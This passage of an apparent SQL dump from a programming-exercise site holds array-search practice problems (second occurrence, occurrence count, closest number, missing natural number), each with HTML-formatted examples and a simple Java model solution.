style=\"font-size:13.0pt;color:black\">Output\r\n3:<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p class=\"MsoNormal\"><span lang=\"EN-US\">-1<o:p></o:p></span></p>','B','<p>import java.util.*;</p><p>class SearchSO</p><p>{</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">	</span>public static void main(String args[])</span></p><p>&nbsp; &nbsp; <span style=\"white-space:pre\">	</span>{</p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Variable and&nbsp; Object Declarations</span></p><p>&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"white-space:pre\">		</span>Scanner input = new Scanner(System.in);</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int n,e,pos=-1,count=0;</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Getting size of Array &amp; Declare Array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>n = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int arr[] = new int[n];</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Get n values to array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>arr[i] = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>e = input.nextInt();</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Linear Search</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>if(arr[i]==e)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>pos = i;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>count++;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>if(count == 2)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">					</span>break;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">				</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">	</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>if(count&lt;2)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>System.out.println(-1);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>else</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>System.out.print(pos);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p>&nbsp; &nbsp; &nbsp; <span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'',32,'','',''),(1134,'Count Number of Occurrences','count-number-of-occurrences','<p class=\"MsoNormal\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">Get an\r\narray of Integers </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">arr[]</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\"> with size </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">n</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\"> and element </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">e</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\"> to be counted. Apply Linear Search / Binary Search to count the occurrence\r\nof element </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">e </i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">in the array </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">arr[].</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\"> Print the count at the end.</span><br></p><p class=\"MsoNormal\"><span lang=\"EN-US\" style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-ansi-language:EN-US\">Examples<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 3 9 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">9<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Output\r\n1:<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">2<o:p></o:p></span></p>','B','<p>import java.util.*;</p><p>class SearchCO</p><p>{</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">	</span>public static void main(String args[])</span></p><p>&nbsp; &nbsp; <span style=\"white-space:pre\">	</span>{</p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Variable and&nbsp; Object Declarations</span></p><p>&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"white-space:pre\">		</span>Scanner input = new Scanner(System.in);</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int n,e,count=0;</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Getting size of Array &amp; Declare Array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>n = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int arr[] = new int[n];</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Get n values to array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>arr[i] = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>e = input.nextInt();</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Linear Search</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>if(arr[i]==e)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>{</span></p><p><span style=\"white-space: pre; white-space: normal;\">				</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>count++;</span></p><p><span style=\"white-space: pre; white-space: normal;\">								</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">	</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>System.out.print(count);</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p>&nbsp; &nbsp; &nbsp; <span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'',32,'','',''),(1135,'Find the Closest Number in the Array','find-the-closest-number-in-the-array','<p class=\"MsoNormal\" style=\"text-align:justify\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Get an\r\narray of Integers </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">arr[]</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\"> with size </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">n</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\"> and target element </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">e</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">. Apply Linear Search / Binary Search\r\nto find closest element to target element </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">e\r\n</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">in the array </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">arr[].</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\"> Print the\r\nclosest element. The array may contains negative numbers. If more than one\r\nelement is closer, print the smaller one.</span><br></p><p class=\"MsoNormal\"><span lang=\"EN-US\" style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-ansi-language:EN-US\">Examples<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 3 9 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">4<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Output\r\n1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">3<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">&nbsp;</span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n2:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 10 13 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">14<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Output\r\n2:<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">13<o:p></o:p></span></p>','B','<p>import java.util.*;</p><p>class Closest</p><p>{</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">	</span>public static void main(String args[])</span></p><p>&nbsp; &nbsp; <span style=\"white-space:pre\">	</span>{</p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Variable and&nbsp; Object Declarations</span></p><p>&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"white-space:pre\">		</span>Scanner input = new Scanner(System.in);</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int n,e,count=0;</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Getting size of Array &amp; Declare Array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>n = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int arr[] = new int[n];</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Get n values to array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>arr[i] = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>e = input.nextInt();</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Linear Search</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int min_diff = Math.abs(e-arr[0]);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int closest = arr[0];</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>int diff = Math.abs(e-arr[i]);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>if(diff &lt; min_diff)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>min_diff = diff;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>closest = arr[i];</span></p><p><span style=\"white-space: pre; white-space: normal;\">								</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>else if(diff == min_diff)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>if(arr[i] &lt; closest)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">					</span>closest = arr[i];</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">			</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">	</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>System.out.print(closest);</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p>&nbsp; &nbsp; &nbsp; <span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'',32,'','',''),(1136,'Find the Missing Number in Array','find-the-missing-number-in-array','<p class=\"MsoNormal\" style=\"text-align:justify\"><span lang=\"EN-US\" style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-ansi-language:EN-US\">Get an array of Integers <i>arr[]</i> with size <i>n</i> and\r\nfind the first missing natural number in the array <i>arr[].The array does not contains duplicates.</i><o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align:justify\"><span lang=\"EN-US\" style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-ansi-language:EN-US\">Example<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">Input 1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">5 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">4 5 3 1 6 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">Output 1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">2<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">Input 1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">6 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">4 5 3 2 6 7<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">Output 1:<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">1<o:p></o:p></span></p>','B','<p>import java.util.*;</p><p>class Missing_Number</p><p>{</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">	</span>public static void main(String args[])</span></p><p>&nbsp; &nbsp; <span style=\"white-space:pre\">	</span>{</p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Variable and&nbsp; Object Declarations</span></p><p>&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"white-space:pre\">		</span>Scanner input = new Scanner(System.in);</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int n;</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Getting size of Array &amp; Declare Array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>n = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int arr[] = new int[n];</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Get n values to array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>arr[i] = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><br></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>Arrays.sort(arr);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: pre; white-space: normal;\">			</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>if(i+1!=arr[i])</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>System.out.print(i+1);<span style=\"white-space:pre\">	</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>break;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">	</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p>&nbsp; &nbsp; &nbsp; <span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'',32,'','',''),(1137,'Find the Missing Number in Array 2','find-the-missing-number-in-array-2','<p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">Get an array of Integers </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">arr []</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\"> with size </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">n</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\"> and\r\nfind the first missing natural number in the array </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">arr[]. The array may contains duplicates.</i><br></p><p class=\"MsoNormal\" style=\"text-align:justify\"><span lang=\"EN-US\" style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-ansi-language:EN-US\">Example<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">Input 1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">5 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">4 5 3 1 6 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">Output 1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">2<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">Input 1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">6 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">4 5 3 1 6 1<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">Output 1:<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">2<o:p></o:p></span></p>','B','<p>import java.util.*;</p><p>class Missing_Number1</p><p>{</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">	</span>public static void main(String args[])</span></p><p>&nbsp; &nbsp; <span style=\"white-space:pre\">	</span>{</p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Variable and&nbsp; Object Declarations</span></p><p>&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"white-space:pre\">		</span>Scanner input = new Scanner(System.in);</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int n,bool=0;</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Getting size of Array &amp; Declare Array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>n = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int arr[] = new int[n];</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Get n values to array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: 